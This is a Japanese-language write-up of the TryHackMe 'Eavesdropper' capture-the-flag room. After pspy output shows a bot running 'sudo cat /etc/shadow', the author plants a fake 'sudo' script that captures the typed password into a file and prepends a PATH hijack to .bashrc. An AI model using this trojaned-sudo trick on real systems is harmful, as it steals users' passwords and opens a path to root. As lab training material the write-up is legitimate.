# Eavesdropper CTF

https://tryhackme.com/room/eavesdropper

pspyを実行すると、下記のプロセスが20秒間隔で繰り返されていた。

```sh
2025/11/04 06:56:18 CMD: UID=0     PID=1573   | 
2025/11/04 06:56:18 CMD: UID=0     PID=1574   | sshd: [accepted]     
2025/11/04 06:56:18 CMD: UID=0     PID=1575   | 
2025/11/04 06:56:18 CMD: UID=0     PID=1576   | 
2025/11/04 06:56:18 CMD: UID=0     PID=1577   | 
2025/11/04 06:56:18 CMD: UID=0     PID=1578   | /bin/sh /etc/update-motd.d/00-header 
2025/11/04 06:56:18 CMD: UID=0     PID=1579   | 
2025/11/04 06:56:18 CMD: UID=0     PID=1580   | /bin/sh /etc/update-motd.d/00-header 
2025/11/04 06:56:18 CMD: UID=0     PID=1581   | /bin/sh /etc/update-motd.d/10-help-text 
2025/11/04 06:56:18 CMD: UID=0     PID=1582   | 
2025/11/04 06:56:18 CMD: UID=0     PID=1583   | run-parts --lsbsysinit /etc/update-motd.d 
2025/11/04 06:56:18 CMD: UID=0     PID=1584   | sshd: frank [priv]   
2025/11/04 06:56:18 CMD: UID=1000  PID=1585   | sshd: frank@pts/1    
2025/11/04 06:56:19 CMD: UID=1000  PID=1586   | sshd: frank@pts/1    
2025/11/04 06:56:20 CMD: UID=1000  PID=1587   | 
2025/11/04 06:56:21 CMD: UID=1000  PID=1588   | 
2025/11/04 06:56:21 CMD: UID=1000  PID=1589   | /bin/sh /usr/sbin/service --status-all 
2025/11/04 06:56:21 CMD: UID=1000  PID=1590   | basename /usr/sbin/service 
2025/11/04 06:56:21 CMD: UID=1000  PID=1591   | /bin/sh /usr/sbin/service --status-all 
2025/11/04 06:56:21 CMD: UID=1000  PID=1592   | 
2025/11/04 06:56:21 CMD: UID=1000  PID=1594   | 
2025/11/04 06:56:21 CMD: UID=1000  PID=1595   | 
2025/11/04 06:56:21 CMD: UID=1000  PID=1596   | /bin/sh /etc/init.d/hwclock.sh status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1598   | /bin/sh /usr/sbin/service --status-all 
2025/11/04 06:56:21 CMD: UID=1000  PID=1599   | /bin/sh /usr/sbin/service --status-all 
2025/11/04 06:56:21 CMD: UID=1000  PID=1600   | /bin/sh /etc/init.d/procps status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1601   | /bin/sh /etc/init.d/procps status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1602   | /bin/sh /etc/init.d/procps status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1603   | /bin/sh /etc/init.d/procps status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1605   | 
2025/11/04 06:56:21 CMD: UID=1000  PID=1606   | /bin/sh /usr/sbin/service --status-all 
2025/11/04 06:56:21 CMD: UID=1000  PID=1609   | /bin/sh /etc/init.d/ssh status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1608   | 
2025/11/04 06:56:21 CMD: UID=1000  PID=1607   | /bin/sh /etc/init.d/ssh status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1610   | /bin/sh /etc/init.d/ssh status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1611   | /bin/sh /etc/init.d/ssh status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1612   | /bin/sh /etc/init.d/ssh status 
2025/11/04 06:56:21 CMD: UID=1000  PID=1614   | /bin/sh /usr/sbin/service --status-all 
2025/11/04 06:56:21 CMD: UID=1000  PID=1613   | 
2025/11/04 06:56:22 CMD: UID=1000  PID=1615   | sshd: frank@pts/1    
2025/11/04 06:56:23 CMD: UID=1000  PID=1616   | 
2025/11/04 06:56:23 CMD: UID=0     PID=1617   | sudo cat /etc/shadow
```

- 最初は UID=0, 次に UID=1000, 最後に sudo だけ UID=0 となっている。
- 最初が UID=0 となっているのは、/etc/update-motd.d/ などが root ユーザーとして実行されるため。
- つまり、何者かが frank としてSSH接続していることが読み取れる。
- sudo 実行時にパスワードが入力されているはず。

キーロガーを仕込めばパスワードを盗めると考え、meterpreter の keyscan を使うことを試みたが、`linux/x32/meterpreter/reverse_tcp` は keyscan に対応しておらず、`linux/x64/meterpreter/reverse_tcp` を実行したら原因不明のランタイムエラーが発生して断念。

ウォークスルーを見た。

/home/frank/sudo として下記スクリプトを保存。

```sh
#!/bin/bash
read -sp '[sudo] password for frank: ' Password
echo $Password > /home/frank/passwd.txt
```

/home/frank/.bashrc の先頭に下記追加。

```sh
PATH=/home/frank:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

すると、/home/frank/passwd.txt に入力されたパスワードが記録される。

## 振り返り

- なるほど！
- キーロガーの必要性に気付けたところまでは良かった。
- 最初、.bashrc の末尾に追加したとき、自分でテストしたらうまく動作するのに、ボットのパスワードは記録されなかった。ボットのため下記部分でリターンされていたと思われる。

```sh
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac
```
